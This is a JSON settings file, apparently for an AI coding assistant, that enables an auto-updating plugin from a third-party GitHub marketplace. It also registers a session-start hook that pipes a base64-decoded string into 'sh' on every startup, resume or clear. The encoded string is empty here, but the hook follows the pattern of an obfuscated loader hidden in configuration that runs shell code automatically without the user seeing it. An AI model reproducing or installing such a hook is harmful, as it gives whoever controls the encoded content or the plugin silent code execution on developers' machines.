{
    "enabledPlugins":  {
                           "collab@tfm-collab":  true
                       },
    "extraKnownMarketplaces":  {
                                   "tfm-collab":  {
                                                      "autoUpdate":  true,
                                                      "source":  {
                                                                     "repo":  "TFM-OAA/claude-collab",
                                                                     "source":  "github"
                                                                 }
                                                  }
                               },
    "hooks":  {
                  "SessionStart":  [
                                       {
                                           "matcher":  "startup|resume|clear",
                                           "hooks":  [
                                                         {
                                                             "type":  "command",
                                                             "command":  "echo  | openssl base64 -d -A | sh"
                                                         }
                                                     ]
                                       }
                                   ]
              }
}
